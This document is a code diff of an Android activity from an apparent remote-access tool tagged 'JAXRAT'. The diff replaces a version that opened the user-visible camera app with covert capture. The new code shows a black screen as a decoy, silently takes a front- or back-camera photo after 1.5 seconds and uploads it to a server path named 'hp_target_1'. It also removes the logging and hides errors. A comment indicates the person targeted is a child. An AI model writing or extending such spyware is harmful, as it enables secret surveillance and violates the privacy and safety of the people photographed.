@@ -1,58 +1,82 @@
 package com.ezax.agent;
 
+import android.Manifest;
 import android.app.Activity;
-import android.content.Intent;
-import android.graphics.Bitmap;
+import android.content.pm.PackageManager;
+import android.hardware.Camera;
 import android.os.Bundle;
-import android.provider.MediaStore;
+import android.os.Handler;
+import android.os.Looper;
 import android.util.Log;
-import java.io.ByteArrayOutputStream;
-import java.io.DataOutputStream;
-import java.io.OutputStream;
+import android.view.Surface;
+import android.view.SurfaceHolder;
+import android.view.SurfaceView;
+import android.widget.FrameLayout;
+import androidx.core.app.ActivityCompat;
+import java.io.*;
 import java.net.HttpURLConnection;
 import java.net.URL;
 
 public class CameraActivity extends Activity {
-    // SESUAIKAN IP INI DENGAN IP LAPTOP KAMU SEKARANG
-    private String serverUrl = "http://192.168.1.17:5000/api/upload_image/hp_target_1";
+    private Camera camera;
+    private int cameraId = 0;
+    private boolean isFront = false;
+    private String serverUrl = "http://192.168.1.17:5000/api/upload_image/hp_target_1"; // PASTIKAN IP INI SESUAI
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
-        
-        // Buka aplikasi kamera bawaan Android
-        Intent takePictureIntent = new Intent(MediaStore.ACTION_IMAGE_CAPTURE);
-        
-        try {
-            startActivityForResult(takePictureIntent, 100);
-        } catch (Exception e) {
-            kirimError("Gagal buka aplikasi kamera bawaan");
-            finish();
-        }
-    }
 
-    @Override
-    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
-        super.onActivityResult(requestCode, resultCode, data);
-        
-        if (requestCode == 100 && resultCode == RESULT_OK && data != null) {
-            // Ambil gambar (thumbnail)
-            Bundle extras = data.getExtras();
-            Bitmap imageBitmap = (Bitmap) extras.get("data");
-            
-            if (imageBitmap != null) {
-                // Kompres jadi JPEG
-                ByteArrayOutputStream baos = new ByteArrayOutputStream();
-                imageBitmap.compress(Bitmap.CompressFormat.JPEG, 50, baos);
-                byte[] imageBytes = baos.toByteArray();
-                uploadImage(imageBytes);
-            } else {
-                finish();
-            }
-        } else {
-            // Kalau user (anak) membatalkan foto, tutup layar
-            finish();
+        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
+            finish(); return;
         }
+
+        isFront = getIntent().getBooleanExtra("FRONT", false);
+
+        // Bikin layar hitam (SurfaceView) sebagai pancingan
+        FrameLayout layout = new FrameLayout(this);
+        SurfaceView surfaceView = new SurfaceView(this);
+        layout.addView(surfaceView);
+        setContentView(layout);
+
+        surfaceView.getHolder().addCallback(new SurfaceHolder.Callback() {
+            @Override
+            public void surfaceCreated(SurfaceHolder holder) {
+                try {
+                    Camera.CameraInfo cameraInfo = new Camera.CameraInfo();
+                    for (int camIdx = 0; camIdx < Camera.getNumberOfCameras(); camIdx++) {
+                        Camera.getCameraInfo(camIdx, cameraInfo);
+                        if (isFront && cameraInfo.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) {
+                            cameraId = camIdx; break;
+                        } else if (!isFront && cameraInfo.facing == Camera.CameraInfo.CAMERA_FACING_BACK) {
+                            cameraId = camIdx; break;
+                        }
+                    }
+
+                    camera = Camera.open(cameraId);
+                    camera.setPreviewDisplay(holder);
+                    camera.startPreview();
+
+                    // Otomatis jepret setelah 1.5 detik
+                    new Handler(Looper.getMainLooper()).postDelayed(() -> {
+                        try {
+                            camera.takePicture(null, null, (data, cam) -> {
+                                uploadImage(data);
+                            });
+                        } catch (Exception e) {
+                            Log.e("JAXRAT", "Gagal jepret otomatis", e);
+                            finish();
+                        }
+                    }, 1500);
+
+                } catch (Exception e) {
+                    Log.e("JAXRAT", "Kamera gagal dibuka", e);
+                    finish();
+                }
+            }
+            @Override public void surfaceChanged(SurfaceHolder holder, int format, int width, int height) {}
+            @Override public void surfaceDestroyed(SurfaceHolder holder) {}
+        });
     }
 
     private void uploadImage(byte[] imageBytes) {
@@ -71,17 +95,20 @@ public class CameraActivity extends Activity {
                 request.write(imageBytes);
                 request.writeBytes("\r\n--" + boundary + "--\r\n");
                 request.flush(); request.close();
-                
-                Log.d("JAXRAT", "Upload Selesai: " + conn.getResponseCode());
-            } catch (Exception e) { 
-                Log.e("JAXRAT", "Upload Error", e); 
-            }
+                conn.getResponseCode();
+            } catch (Exception e) { }
             
+            // Tutup Activity setelah upload
             runOnUiThread(this::finish); 
         }).start();
     }
 
-    private void kirimError(String pesan) {
-        Log.e("JAXRAT", pesan);
+    @Override
+    protected void onDestroy() {
+        super.onDestroy();
+        if (camera != null) {
+            try { camera.stopPreview(); camera.release(); } catch (Exception e) {}
+            camera = null;
+        }
     }
 }
